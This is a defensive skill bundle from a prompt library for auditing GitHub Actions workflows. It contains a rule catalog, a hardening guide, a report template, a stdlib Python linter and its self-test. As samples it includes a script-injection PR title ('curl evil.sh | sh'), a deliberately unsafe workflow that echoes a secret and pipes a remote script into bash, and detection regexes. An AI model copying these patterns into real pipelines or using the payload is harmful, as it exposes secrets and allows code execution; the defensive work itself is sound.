# GitHub Actions Workflow Security Reviewer

By @f · general
Language: en · Domains: education · Source: P01

Source page: https://prompts.chat

```
---
name: github-actions-workflow-security-reviewer
description: Reviews GitHub Actions workflow YAML for supply-chain and injection risks: pull_request_target with PR checkout, untrusted github.event text in run steps, actions pinned to tags or branches instead of commit SHAs, missing or write-all permissions, secrets in shell commands, curl | bash, self-hosted runners on PRs, and missing timeouts. Use before merging CI changes or auditing a repo. Includes a stdlib Python linter with --self-test.
---

# GitHub Actions Workflow Security Reviewer

You help maintainers find and fix security problems in `.github/workflows/*.yml` before an attacker does. You read each workflow the way a malicious fork, issue author, or compromised third-party action would, point to the exact line that is risky, explain how it could be abused in one or two sentences, and give a minimal patch that keeps the workflow working.

## Files in this skill

- `scripts/gha_audit.py` - line-based linter for workflow files: triggers, permissions, `uses:` pinning, script injection in `run:` and `github-script`, secrets in commands, remote scripts piped to a shell, self-hosted runners, timeouts (Python 3 standard library only, no YAML library needed)
- `references/risk-catalog.md` - every rule ID with severity, why it matters, and the fix
- `references/hardening-guide.md` - safe patterns: env indirection, least-privilege permissions, SHA pinning with Dependabot, splitting privileged and unprivileged workflows
- `templates/workflow-security-review.md` - a review comment or audit report
- `examples/pr-labeler.yml` - a deliberately unsafe workflow and its expected findings

## Workflow

### 1. Collect the workflows
Ask for the workflow files (or the repository path) and the context: public or private repo, whether forks can open pull requests, which secrets and environments exist, and whether self-hosted runners are used. Workflows triggered by `pull_request_target`, `issue_comment`, `issues`, `workflow_run`, or `discussion` deserve the closest look because they run with repository secrets on events outsiders can create.

### 2. Run the linter
'''
python3 scripts/gha_audit.py .github/workflows/*.yml
python3 scripts/gha_audit.py examples/pr-labeler.yml --json
python3 scripts/gha_audit.py ci.yml --strict
python3 scripts/gha_audit.py --self-test
'''
Exit code 1 means at least one high finding (`--strict`: any finding); 2 means a file could not be read. The linter does not need PyYAML; it understands common workflow layouts but can miss unusual YAML (anchors, flow mappings). Read the file yourself as well.

### 3. Confirm each finding
For every finding, check the context the script cannot see: is the expression really attacker-controlled, does the job have secrets or a write token, is the action from a trusted publisher? Downgrade or dismiss with a stated reason; never silently drop a high finding.

### 4. Propose fixes
Use `references/risk-catalog.md` for each rule ID and `references/hardening-guide.md` for patterns. Prefer small, reviewable diffs: move `${{ }}` into `env:` and quote the shell variable, add a top-level `permissions: contents: read`, pin `uses:` to a full commit SHA with the tag in a comment, and add `persist-credentials: false` and `timeout-minutes`.

### 5. Report
Fill `templates/workflow-security-review.md`: files reviewed, findings by severity with line numbers, the attack scenario for each high finding, the patch, and follow-ups (Dependabot for actions, branch protection, environment reviewers).

## Rules

- Treat titles, bodies, branch names, commit messages, and comments from PRs and issues as attacker input.
- Never ask for or print secret values; refer to secrets by name only.
- Do not write proof-of-concept exploits against repositories the user does not own; describe the risk instead.
- A clean linter run is not a guarantee. Say what was not checked (reusable workflows, composite actions, repository settings).
FILE:references/risk-catalog.md
# Risk Catalog (rule IDs used by gha_audit.py)

| ID | Severity | What it detects | Why it matters | Fix |
|---|---|---|---|---|
| GHA001 | high | `pull_request_target` (or `workflow_run`) workflow that checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`, `head.ref`, `github.head_ref`) | Code from a fork runs with repository secrets and a write token ("pwn request") | Use `pull_request` for building untrusted code; keep `pull_request_target` for labeling/commenting only, without checkout of PR code |
| GHA002 | high | Untrusted `${{ }}` expression inside `run:` or `github-script` `script:` (issue/PR title or body, comment body, head ref, commit message, author name/email, page name) | The text is pasted into the script before it runs, so a title like `"; curl evil.sh | sh #` executes | Pass it through `env:` and use `"$TITLE"` in the shell |
| GHA003 | medium (low for `actions/*`, `github/*`) | `uses: owner/repo@v4` pinned to a tag | Tags can be moved; a compromised action ships code into your build | Pin to the full 40-character commit SHA, keep the tag in a comment, let Dependabot update it |
| GHA004 | high | `uses:` with a branch (`@main`, `@master`) or no ref | Every run pulls whatever is on that branch today | Pin to a commit SHA |
| GHA005 | medium | No `permissions:` at workflow level and not on every job | The `GITHUB_TOKEN` gets the repository default, often read/write on everything | Add `permissions: contents: read` at the top and grant more per job |
| GHA006 | high | `permissions: write-all` | Every scope can be written by any step | List only the scopes needed |
| GHA007 | high / medium | `${{ secrets.X }}` inside a `run:` command (high when echoed or printed) | Secrets end up in shell history, process lists, logs, or injected text | Map the secret to `env:` and read `$X`; never echo it |
| GHA008 | medium | `curl ... \| bash` or `wget ... \| sh` | Runs unverified remote code with the job's token and secrets | Download, verify a checksum or signature, then run; or use a pinned action |
| GHA009 | medium | `self-hosted` runner in a workflow triggered by `pull_request` or `pull_request_target` | Fork code can persist on the machine and attack later jobs | Use GitHub-hosted or ephemeral runners for PRs; require approval for outside contributors |
| GHA010 | high | `ACTIONS_ALLOW_UNSECURE_COMMANDS: true` | Re-enables deprecated `set-env`/`add-path`, which log output can trigger | Remove it; write to `$GITHUB_ENV` and `$GITHUB_PATH` |
| GHA011 | low | `actions/checkout` without `persist-credentials: false` | The token stays in `.git/config` for every later step and any uploaded artifact | Add `persist-credentials: false` unless a later step pushes |
| GHA012 | low | Job without `timeout-minutes` | A hung or abused job can run for 6 hours on your minutes | Add a realistic timeout (e.g. 15-30) |
| GHA013 | low | `docker://image:tag` without `@sha256:` digest | Image tags are mutable | Pin `docker://image@sha256:<digest>` |
| GHA014 | medium | `workflow_run` workflow using `actions/download-artifact` | Artifacts from a fork-triggered run are attacker-controlled | Treat artifact contents as data: validate, never execute; avoid extracting into the workspace |

## Severity guide
- **high**: an outsider can likely run code with secrets or a write token, or a mutable reference controls the build.
- **medium**: hardening gap that makes a compromise easier or bigger.
- **low**: good practice; fix when touching the file.
FILE:references/hardening-guide.md
# Hardening Guide

## 1. Pass untrusted text through env, not expressions
'''yaml
# unsafe
- run: echo "Title: ${{ github.event.pull_request.title }}"
# safe
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
'''
Always double-quote the variable. In `actions/github-script`, read `context.payload.pull_request.title` in JavaScript instead of interpolating `${{ }}` into the script.

## 2. Least-privilege token
'''yaml
permissions:
  contents: read          # workflow default
jobs:
  label:
    permissions:
      pull-requests: write  # only this job can label
'''
Also set the repository default to read-only (Settings > Actions > General > Workflow permissions).

## 3. Pin actions to commit SHAs
'''yaml
- uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
'''
Enable Dependabot for the `github-actions` ecosystem so pins get update PRs with changelogs. Prefer actions from verified publishers and read the source of small third-party actions before adopting them.

## 4. Split privileged and unprivileged work
- `pull_request` workflow: builds and tests fork code with no secrets and a read-only token; uploads results as an artifact.
- `workflow_run` workflow: runs after it with secrets, downloads the artifact, treats it as untrusted data (parse JSON, never execute), and posts the comment or label.

## 5. Checkout and credentials
- `persist-credentials: false` on `actions/checkout` unless the job pushes.
- Never check out PR code in `pull_request_target`; if you must (e.g. a labeler reading config), check out the base branch only.

## 6. Runners and limits
- Self-hosted runners: private repositories only, or ephemeral (one job per VM) with no network access to internal systems.
- `timeout-minutes` on every job; `concurrency` groups for deploys.

## 7. Secrets and environments
- Put deploy credentials in an environment with required reviewers and branch rules.
- Prefer OIDC (`id-token: write`) to long-lived cloud keys.
- Mask derived values with `::add-mask::` before printing anything secret-like.

## Review checklist
1. Which triggers can outsiders fire?
2. What can the token write, and which secrets are reachable from those triggers?
3. Is any attacker-controlled text interpolated into a script?
4. Is every `uses:` pinned to a SHA?
5. Is any remote code executed without verification?
FILE:templates/workflow-security-review.md
# GitHub Actions Security Review - <repository>

**Date:** <YYYY-MM-DD>  **Reviewer:** <name>  **Files:** <.github/workflows/...>
**Repo visibility:** <public/private>  **Fork PRs allowed:** <yes/no>  **Self-hosted runners:** <yes/no>
**Linter:** `gha_audit.py` -> <n> high, <n> medium, <n> low

## High findings
| Rule | File:line | Problem | Attack scenario | Fix |
|---|---|---|---|---|
| | | | | |

## Medium and low findings
| Rule | File:line | Problem | Fix |
|---|---|---|---|
| | | | |

## Dismissed findings
- <rule, file:line> - <reason it is not exploitable here>

## Proposed patch
'''diff
<minimal diff>
'''

## Not covered by this review
- Reusable workflows and composite actions called from these files
- Repository and organization settings (default token permissions, fork PR approval, environments)

## Follow-ups
- [ ] Enable Dependabot for github-actions
- [ ] Set default workflow permissions to read-only
- [ ] Require reviewers on the production environment
FILE:examples/pr-labeler.yml
# Deliberately unsafe example for gha_audit.py. Expected findings (line numbers in this file):
#   GHA001 high   line 21 - pull_request_target checks out the PR head
#   GHA002 high   line 24 - PR title pasted into run (script injection)
#   GHA007 high   line 25 - secret echoed in run
#   GHA004 high   line 27 - third-party action on @main
#   GHA005 medium line 1  - no permissions block at workflow or job level
#   GHA008 medium line 26 - curl piped to bash
#   GHA012 low    line 16 - job without timeout-minutes
#   GHA003 low    line 19 - actions/checkout@v4 pinned to a tag
#   GHA011 low    line 19 - checkout without persist-credentials: false
name: PR labeler
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Greet
        run: |
          echo "Thanks for: ${{ github.event.pull_request.title }}"
          echo "token=${{ secrets.LABEL_TOKEN }}"
          curl -sSL https://example.com/install.sh | bash
      - uses: someorg/auto-labeler@main
FILE:scripts/gha_audit.py
#!/usr/bin/env python3
"""GitHub Actions workflow security linter (Python 3 standard library only, no YAML library).

Reads workflow files line by line, tracking indentation, and reports risky patterns with rule IDs
(see references/risk-catalog.md):
  GHA001 pull_request_target/workflow_run + checkout of PR head      high
  GHA002 untrusted ${{ github.event.* }} text inside run:/script:    high
  GHA003 uses: pinned to a tag instead of a commit SHA               medium (low for actions/*, github/*)
  GHA004 uses: on a branch (@main/@master) or without a ref          high
  GHA005 no permissions at workflow level or on every job            medium
  GHA006 permissions: write-all                                      high
  GHA007 ${{ secrets.* }} inside run: (high when echoed/printed)     high/medium
  GHA008 curl/wget piped to a shell                                  medium
  GHA009 self-hosted runner on pull_request(_target)                 medium
  GHA010 ACTIONS_ALLOW_UNSECURE_COMMANDS enabled                     high
  GHA011 actions/checkout without persist-credentials: false         low
  GHA012 job without timeout-minutes                                 low
  GHA013 docker:// image without @sha256 digest                      low
  GHA014 workflow_run + actions/download-artifact                    medium

Usage:
  python3 gha_audit.py .github/workflows/*.yml
  python3 gha_audit.py ci.yml --json
  python3 gha_audit.py ci.yml --strict      # exit 1 on any finding
  python3 gha_audit.py --self-test
Exit code: 0 no high findings, 1 high findings (or any with --strict), 2 unreadable file.
"""
import argparse
import json
import re
import sys

SEV_ORDER = {"high": 0, "medium": 1, "low": 2}
TRUSTED_OWNERS = {"actions", "github"}
BRANCH_REFS = {"main", "master", "dev", "develop", "trunk", "head", "latest"}
UNTRUSTED_EXPR = re.compile(
    r"github\.head_ref"
    r"|github\.event\.[\w.*\[\]'\"-]*?\b(title|body|message|page_name|email|head_branch|default_branch|label)\b"
    r"|github\.event\.[\w.*\[\]'\"-]*?head\.ref\b"
    r"|github\.event\.[\w.*\[\]'\"-]*?author\.name\b"
)
EXPR = re.compile(r"\$\{\{(.*?)\}\}")
SECRET_EXPR = re.compile(r"\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}")
PR_HEAD_REF = re.compile(r"ref:\s*['\"]?\$\{\{\s*(github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(sha|branch))\s*\}\}")
PIPE_SHELL = re.compile(r"\b(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(-E\s+)?(ba|z|da)?sh\b")
PRINT_CMD = re.compile(r"\b(echo|printf|cat|tee|print)\b")
SHA40 = re.compile(r"^[0-9a-f]{40}$")


def strip_comment(line):
    """Remove a trailing YAML comment (a # preceded by whitespace, outside quotes)."""
    out, q = [], None
    for i, ch in enumerate(line):
        if q:
            if ch == q:
                q = None
        elif ch in "'\"":
            q = ch
        elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
            break
        out.append(ch)
    return "".join(out).rstrip()


def indent_of(s):
    return len(s) - len(s.lstrip(" "))


def parse_lines(text):
    """Return a list of (lineno, indent, content) for non-empty, non-comment lines."""
    rows = []
    for n, raw in enumerate(text.splitlines(), 1):
        s = strip_comment(raw.replace("\t", "  "))
        if s.strip():
            rows.append((n, indent_of(s), s.strip()))
    return rows


def block_end(rows, i):
    """Index after the block owned by rows[i] (all following rows indented deeper)."""
    ind = rows[i][1]
    j = i + 1
    while j < len(rows) and rows[j][1] > ind:
        j += 1
    return j


def key_of(content):
    c = content[2:].lstrip() if content.startswith("- ") else content
    m = re.match(r"^['\"]?([A-Za-z0-9_\-]+)['\"]?\s*:(\s|$)", c)
    return (m.group(1), c[m.end():].strip()) if m else (None, None)


def triggers(rows):
    trig = set()
    for i, (n, ind, c) in enumerate(rows):
        k, v = key_of(c)
        if ind == 0 and k in ("on", "true"):
            if v:
                trig.update(re.findall(r"[a-z_]+", v))
            else:
                end = block_end(rows, i)
                child = min((rows[j][1] for j in range(i + 1, end)), default=None)
                for j in range(i + 1, end):
                    if rows[j][1] == child:
                        ck, _ = key_of(rows[j][2])
                        if ck:
                            trig.add(ck)
                        elif rows[j][2].startswith("- "):
                            trig.add(rows[j][2][2:].strip())
    return trig


def audit_text(text, path="workflow.yml"):
    rows = parse_lines(text)
    findings = []

    def add(rule, sev, line, msg):
        findings.append({"file": path, "line": line, "rule": rule, "severity": sev, "message": msg})

    trig = triggers(rows)
    privileged = trig & {"pull_request_target", "workflow_run"}
    pr_triggers = trig & {"pull_request", "pull_request_target"}

    top_perm = None
    jobs_idx = None
    for i, (n, ind, c) in enumerate(rows):
        k, v = key_of(c)
        if ind == 0 and k == "permissions":
            top_perm = (n, v)
        if ind == 0 and k == "jobs":
            jobs_idx = i
    if top_perm and top_perm[1].strip("'\"") == "write-all":
        add("GHA006", "high", top_perm[0], "permissions: write-all gives every step write access to all scopes")

    # jobs
    jobs = []
    if jobs_idx is not None:
        end = block_end(rows, jobs_idx)
        child = min((rows[j][1] for j in range(jobs_idx + 1, end)), default=None)
        for j in range(jobs_idx + 1, end):
            if rows[j][1] == child and key_of(rows[j][2])[0]:
                jobs.append((j, block_end(rows, j)))
    jobs_with_perm = 0
    for (js, je) in jobs:
        jname = key_of(rows[js][2])[0]
        jind = rows[js][1]
        direct = [r for r in rows[js + 1:je] if r[1] == min(x[1] for x in rows[js + 1:je])] if je > js + 1 else []
        dkeys = {key_of(r[2])[0]: r for r in direct}
        if "permissions" in dkeys:
            jobs_with_perm += 1
            if dkeys["permissions"][2].split(":", 1)[1].strip().strip("'\"") == "write-all":
                add("GHA006", "high", dkeys["permissions"][0], f"job '{jname}' uses permissions: write-all")
        if "timeout-minutes" not in dkeys and "uses" not in dkeys:
            add("GHA012", "low", rows[js][0], f"job '{jname}' has no timeout-minutes (default is 360)")
        if "runs-on" in dkeys:
            ro_i = rows.index(dkeys["runs-on"])
            ro_text = " ".join(r[2] for r in rows[ro_i:block_end(rows, ro_i)])
            if "self-hosted" in ro_text and pr_triggers:
                add("GHA009", "medium", dkeys["runs-on"][0], f"job '{jname}' runs pull request code on a self-hosted runner")
    if top_perm is None and (not jobs or jobs_with_perm < len(jobs)):
        add("GHA005", "medium", 1, "no permissions block at workflow level (and not on every job); GITHUB_TOKEN gets the repo default")

    # line-level checks
    i = 0
    while i < len(rows):
        n, ind, c = rows[i]
        k, v = key_of(c)
        if k in ("run", "script"):
            end = block_end(rows, i)
            body = [(n, v)] if v and v not in ("|", ">", "|-", ">-", "|+", ">+") else []
            body += [(r[0], r[2]) for r in rows[i + 1:end]]
            for bn, bt in body:
                for m in EXPR.finditer(bt):
                    expr = m.group(1).strip()
                    if UNTRUSTED_EXPR.search(expr):
                        add("GHA002", "high", bn, f"untrusted expression ${{{{ {expr} }}}} is pasted into {k}: (script injection); pass it via env")
                for m in SECRET_EXPR.finditer(bt):
                    if PRINT_CMD.search(bt):
                        add("GHA007", "high", bn, f"secret {m.group(1)} is printed in {k}:")
                    else:
                        add("GHA007", "medium", bn, f"secret {m.group(1)} is interpolated into {k}:; map it to env instead")
                if k == "run" and PIPE_SHELL.search(bt):
                    add("GHA008", "medium", bn, "remote script piped straight into a shell")
            i = end
            continue
        if k == "uses":
            ref = v.strip("'\"")
            if ref.startswith("./"):
                pass
            elif ref.startswith("docker://"):
                if "@sha256:" not in ref:
                    add("GHA013", "low", n, f"{ref} is not pinned to an image digest")
            else:
                name, _, at = ref.partition("@")
                owner = name.split("/")[0].lower()
                if not at or at.lower() in BRANCH_REFS:
                    add("GHA004", "high", n, f"{ref or name} follows a branch or has no ref; pin to a commit SHA")
                elif not SHA40.match(at):
                    sev = "low" if owner in TRUSTED_OWNERS else "medium"
                    add("GHA003", sev, n, f"{ref} is pinned to a tag, not a full commit SHA")
                if name.lower().startswith("actions/checkout"):
                    # the step block: siblings at this indent (after '- ') and deeper
                    step_ind = ind + 2 if c.startswith("- ") else ind
                    j = i + 1
                    j0 = i
                    while j0 > 0 and not rows[j0][2].startswith("- ") and rows[j0][1] >= step_ind:
                        j0 -= 1
                    while j < len(rows) and rows[j][1] >= step_ind and not (rows[j][1] == step_ind - 2 and rows[j][2].startswith("- ")):
                        j += 1
                    step = " ".join(r[2] for r in rows[j0:j])
                    if not re.search(r"persist-credentials:\s*['\"]?false", step):
                        add("GHA011", "low", n, "actions/checkout keeps the token in .git/config; add persist-credentials: false")
                if name.lower().startswith("actions/download-artifact") and "workflow_run" in trig:
                    add("GHA014", "medium", n, "artifact from a workflow_run may be attacker-controlled; treat as data")
        if privileged and PR_HEAD_REF.search(c):
            add("GHA001", "high", n, f"{'/'.join(sorted(privileged))} workflow checks out untrusted PR code with secrets available")
        if re.search(r"ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*['\"]?true", c, re.I):
            add("GHA010", "high", n, "ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables set-env/add-path")
        i += 1

    findings.sort(key=lambda f: (f["file"], SEV_ORDER[f["severity"]], f["line"], f["rule"]))
    return {"file": path, "triggers": sorted(trig), "jobs": len(jobs), "findings": findings}


def to_markdown(results):
    out = ["# GitHub Actions security audit", ""]
    tot = {"high": 0, "medium": 0, "low": 0}
    for r in results:
        for f in r["findings"]:
            tot[f["severity"]] += 1
    out.append(f"**Files:** {len(results)}  **Findings:** {tot['high']} high, {tot['medium']} medium, {tot['low']} low")
    for r in results:
        out += ["", f"## {r['file']}", f"Triggers: {', '.join(r['triggers']) or 'none found'}; jobs: {r['jobs']}", ""]
        if not r["findings"]:
            out.append("No findings.")
            continue
        out += ["| Severity | Rule | Line | Finding |", "|---|---|---|---|"]
        for f in r["findings"]:
            msg = f["message"].replace("|", "\\|")
            out.append(f"| {f['severity']} | {f['rule']} | {f['line']} | {msg} |")
    return "\n".join(out)


SAFE = """name: CI
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
        with:
          persist-credentials: false
      - name: Test
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Testing $PR_TITLE"
          make test
"""


def self_test():
    cases = []

    def ok(name, cond):
        cases.append((name, bool(cond)))

    def rules(text):
        return [(f["rule"], f["severity"]) for f in audit_text(text)["findings"]]

    ok("safe workflow has no findings", rules(SAFE) == [])
    ok("triggers parsed from block", audit_text(SAFE)["triggers"] == ["pull_request"])
    ok("triggers parsed from list", audit_text("on: [push, pull_request]\njobs: {}\n")["triggers"] == ["pull_request", "push"])
    inj = SAFE.replace('echo "Testing $PR_TITLE"', 'echo "${{ github.event.pull_request.title }}"')
    ok("title in run is GHA002 high", ("GHA002", "high") in rules(inj))
    ok("head_ref in run is GHA002", ("GHA002", "high") in rules(SAFE.replace("make test", "git push origin ${{ github.head_ref }}")))
    ok("comment body in github-script", ("GHA002", "high") in rules(SAFE.replace("run: |", "script: |")
                                                                      .replace("make test", "core.info('${{ github.event.comment.body }}')")))
    ok("env indirection is not flagged", not any(r == "GHA002" for r, _ in rules(SAFE)))
    ok("PR number is safe", rules(SAFE.replace("make test", "echo ${{ github.event.pull_request.number }}")) == [])
    ok("tag pin on actions/* is GHA003 low", ("GHA003", "low") in rules(SAFE.replace("@08eba0b27e820071cde6df949e0beb9ba4906955", "@v4")))
    ok("tag pin third party is medium", ("GHA003", "medium") in rules(SAFE.replace("actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955", "acme/checkout@v1")))
    ok("branch pin is GHA004 high", ("GHA004", "high") in rules(SAFE.replace("@08eba0b27e820071cde6df949e0beb9ba4906955", "@main")))
    ok("local action not flagged", rules(SAFE.replace("actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955", "./.github/actions/setup")) == [])
    ok("missing permissions is GHA005", ("GHA005", "medium") in rules(SAFE.replace("permissions:\n  contents: read\n", "")))
    ok("job-level permissions satisfy GHA005", rules(SAFE.replace("permissions:\n  contents: read\n", "").replace("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    permissions:\n      contents: read\n")) == [])
    ok("write-all is GHA006", ("GHA006", "high") in rules(SAFE.replace("permissions:\n  contents: read", "permissions: write-all")))
    ok("echoed secret is GHA007 high", ("GHA007", "high") in rules(SAFE.replace("make test", "echo ${{ secrets.NPM_TOKEN }}")))
    ok("inline secret is GHA007 medium", ("GHA007", "medium") in rules(SAFE.replace("make test", "npm publish --token ${{ secrets.NPM_TOKEN }}")))
    ok("curl | bash is GHA008", ("GHA008", "medium") in rules(SAFE.replace("make test", "curl -fsSL https://x.sh | sudo bash")))
    ok("self-hosted on PR is GHA009", ("GHA009", "medium") in rules(SAFE.replace("ubuntu-latest", "[self-hosted, linux]")))
    ok("self-hosted on push is fine", rules(SAFE.replace("pull_request:", "push:").replace("ubuntu-latest", "self-hosted")) == [])
    ok("unsecure commands is GHA010", ("GHA010", "high") in rules(SAFE.replace("PR_TITLE: ${{ github.event.pull_request.title }}", "ACTIONS_ALLOW_UNSECURE_COMMANDS: true")))
    ok("checkout without persist-credentials is GHA011", ("GHA011", "low") in rules(SAFE.replace("        with:\n          persist-credentials: false\n", "")))
    ok("missing timeout is GHA012", ("GHA012", "low") in rules(SAFE.replace("    timeout-minutes: 15\n", "")))
    ok("docker tag is GHA013", ("GHA013", "low") in rules(SAFE.replace("actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0", "docker://alpine:3.20")))
    prt = SAFE.replace("pull_request:", "pull_request_target:").replace("persist-credentials: false", "persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}")
    ok("pull_request_target + head checkout is GHA001", ("GHA001", "high") in rules(prt))
    ok("pull_request + head checkout is not GHA001", not any(r == "GHA001" for r, _ in rules(SAFE.replace("persist-credentials: false", "persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}"))))
    wr = SAFE.replace("pull_request:", "workflow_run:\n    workflows: [CI]").replace("      - name: Test", "      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5\n      - name: Test")
    ok("workflow_run + download-artifact is GHA014", ("GHA014", "medium") in rules(wr))
    ok("comment with # in string kept", strip_comment('run: echo "a # b" # note') == 'run: echo "a # b"')
    md = to_markdown([audit_text(inj, "ci.yml")])
    ok("markdown lists file and rule", "## ci.yml" in md and "GHA002" in md)
    passed = sum(c for _, c in cases)
    for name, c in cases:
        print(("PASS " if c else "FAIL ") + name)
    print(f"{passed}/{len(cases)} passed")
    return 0 if passed == len(cases) else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="Lint GitHub Actions workflow files for security risks.")
    ap.add_argument("files", nargs="*", help="workflow .yml files ('-' for stdin)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--strict", action="store_true", help="exit 1 on any finding")
    ap.add_argument("--self-test", action="store_true")
    a = ap.parse_args(argv)
    if a.self_test:
        return self_test()
    if not a.files:
        ap.error("at least one workflow file required (or --self-test)")
    results = []
    for p in a.files:
        try:
            text = sys.stdin.read() if p == "-" else open(p, encoding="utf-8").read()
        except OSError as e:
            print(f"error: {e}", file=sys.stderr)
            return 2
        results.append(audit_text(text, p))
    print(json.dumps(results, indent=2) if a.json else to_markdown(results))
    allf = [f for r in results for f in r["findings"]]
    if any(f["severity"] == "high" for f in allf) or (a.strict and allf):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

Prompt from the public prompts.chat library (CC0), credited to its contributor.
